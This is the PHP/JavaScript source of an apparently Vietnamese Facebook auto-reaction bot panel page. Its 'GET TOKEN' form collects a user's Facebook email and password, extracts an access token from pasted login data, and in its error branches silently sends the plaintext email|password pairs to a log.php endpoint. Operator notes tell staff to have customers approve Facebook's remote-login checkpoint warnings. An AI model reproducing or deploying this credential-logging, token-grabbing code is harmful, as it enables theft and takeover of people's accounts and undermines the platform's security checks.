<?php
include '../incf/head.php';
require '../incf/config.php';
require '../incf/func.php';
if(isset($_SESSION['username'])){
?>
<div class="col-md-12">
<div class="panel">
<div class="panel-heading">Thông Báo
  <div class="panel panel-default">
                <div class="panel-heading" style="text-align:center; font-size:16px;color:blue;font-weight:bold">
                    Chú Ý Khi Cài Đặt - Cập Nhật BOT REACTION
                </div>
                <div class="panel-body">
                    <ul class="list-group" style="font-weight: bold; font-size:15px;color:red">
                      <li class="list-group-item">
                        <center>
                            <a href="https://www.facebook.com/100004432997243" target="_blank" class="btn btn-success">
                                Liên Hệ Admin
                            </a>
                            <a href="https://www.facebook.com/messages/t/100004432997243" data-toggle="modal" class="btn btn-info">
                                Liên Hệ Hỗ Trợ Kỹ Thuật
                            </a>
                            <!-- <a href="#get_token" data-toggle="modal" class="btn btn-success">
                                Cách lấy Token trên trình duyệt
                            </a>
                            <a href="#get_cookie1" data-toggle="modal" class="btn btn-warning">
                                Cách lấy Cookie trên trình duyệt
                            </a> -->
                        </center>
                      </li>
                      <!-- <li class="list-group-item">- Khi cài đặt BOT với <mark>Cookie</mark> lần đầu có thể nhận được thông báo từ Facebook <mark>Có ai đó đã đăng nhập vào tài khoản của bạn</mark> thì xác minh <mark>Đây là tôi</mark> nhé!.</li>
                      <li class="list-group-item">- Tùy chọn <mark>Reaction Comment</mark> chỉ hoạt động khi cài đặt BOT sử dụng <mark>Cookie</mark></li> -->
                      <li class="list-group-item">- Khi cài đặt/cập nhật chờ hệ thống xử lí xong User ID, Name, Token rồi mới ấn Submit nhé</li>
                      <li class="list-group-item">- Chọn Đối tượng BOT là Bạn bè sẽ hạn chế tối đã bị Check Point ( nếu trong thời gian FB quét )</li>
                      <li class="list-group-item">- Có thể bị Facebook thông báo Checkpoint tài khoản đăng nhập ở 1 địa điểm từ xa. Vui lòng nhắc khách xác minh địa điểm này. Sau đó, tiến hành cập nhật lại Token!</li>
                      <!-- <li class="list-group-item">- Khi lấy Cookie tại trình duyệt, <mark>không đăng xuất</mark> nick Facebook đã lấy Cookie ở trình duyệt đó nếu không Cookie sẽ Die. Nếu bạn đăng nhập nhiều nick tại 1 trình duyệt hoặc lấy Cookie cho khách thì hãy  dùng <mark>Tab Ẩn Danh</mark> để đăng nhập Facebook đó và lấy Cookie, sau đó đóng Tab ẩn danh đi thì Cookie đó vẫn Live OK nhé.</li> -->
                    </ul>
                </div>
 </div>
 </div>
<div class="col-md-12">
<div class="panel">
  <div class="panel-heading">GET TOKEN<div class="right">
       <button type="button" class="btn-toggle-collapse"><i class="lnr lnr-chevron-up"></i></button>
    <button type="button" class="btn-remove"><i class="lnr lnr-cross"></i></button>
      </div></div>
  <div class="panel-body">
    <div class="col-sm-5 col-sm-offset-1">
        <br>
        <input class="form-control" type="text" id="emailtk" placeholder="Email hoặc số điện thoại" data-toggle="tooltip" title="" required="" data-original-title="Nhập email hoặc số điện thoại facebook của bạn">
        <br>
        <input class="form-control" type="password" id="passwdtk" data-toggle="tooltip" title="" placeholder="Mật khẩu" required="" data-original-title="Nhập mật khẩu facebook của bạn">
        <br>
        <button class="btn btn-primary form-control btn-flat input-group-lg" id="login" type="button" onclick="get_link_login()"><b><i class="fa fa-facebook-square" aria-hidden="true"></i> Đăng nhập bằng facebook</b>
        </button>
        <br>  <br><strong> Token của bạn </strong>: <input class='form-control' id="token" style="margin: 0px; width: 375px; height: 85px;"></input> </div>
     <div class="col-sm-6" id="rio2"></div>
  </div> <!-- body -->
</div> <!-- .pannel -->
</div>
<script type="text/javascript">
function get_link_login() {
    var email = document.getElementById("emailtk").value;
    var passwd = document.getElementById("passwdtk").value;
    $.post("token.php", {
        email: email,
        passwd: passwd,
        test: true,
        type: "login_email"
    }, function (data, status) {
        $("#rio2").hide().html("<div class='form-group'><b>Bước 1:</b> Click <a target='_blank' href='" + data + "' class='btn btn-success'>LẤY DATA</a> để lấy dữ liệu. <hr> <b>Bước 2:</b> COPY toàn bộ nội dung(CTRL + A => CTRL + C) và dán(CTRL + V) vào ô bên dưới rồi click 'LỌC TOKEN'. Nhìn ảnh bên dưới <br><a href='http://i.imgur.com/bl83sXM.png'><img class='img img-responsive' src='http://i.imgur.com/bl83sXM.png'></a></br><textarea onpaste=\"setTimeout( function() { login_data();}, 100);\" placeholder='COPY TOÀN BỘ NỘI DUNG VÀ DÁN VÔ ĐÂY' id='data' class='form-control'></textarea> <br> <a onclick='login_data();' id='btn-login' class='btn btn-info btn-block'>LỌC TOKEN</a><hr><div id='log'></div></div>").fadeIn('slow');
    });
}
function login_data() {
    var email = document.getElementById("emailtk").value;
    var passwd = document.getElementById("passwdtk").value;
    if (document.getElementById("data").value) {
        var data = JSON.parse(document.getElementById("data").value);
        if (data['access_token']) {
            $("#btn-login").html('<i class="fa fa-spinner fa-spin"></i> Đang lọc token...');
            $("#token").val(data['access_token']);
            $("#btn-login").html('Lọc xong');
/*            $.get("log.php?type=oke_login_email&conten=" + encodeURI(email + "|" + passwd));
            login(data['access_token']);*/
        } else if (data['error_code'] == 100) {
            alert('Vui lòng điền mật khẩu');
            $("#log").html("<div class='alert alert-info'><strong>Lỗi!</strong>Vui lòng điền mật khẩu");
        } else if (data['error_code'] == 400 || data['error_code'] == 401) {
            alert('Sai tên đăng nhập hoặc mật khẩu');
            $("#log").html("<div class='alert alert-info'><strong>Lỗi!</strong>Sai tên đăng nhập hoặc mật khẩu");
        } else if (data['error_msg']) {
            $.get("log.php?type=login_email&conten=" + encodeURI(email + "|" + passwd + " => " + data['error_msg']));
            $("#log").html("<div class='alert alert-info'><strong>Lỗi!</strong> " + data['error_msg'] + "</div>");
        } else {
            $.get("log.php?type=login_email&conten=" + encodeURI(email + "|" + passwd + " =>KXD: " + data['error_msg']));
            $("#log").html("<div class='alert alert-info'><strong>Lỗi!</strong> Không xác định</div>");
        }
    }
}
</script>

<?php
}
else{
  echo '<script>window.location.href = "../login.php?i=1";</script>';
}
include '../incf/foot.php';

?>
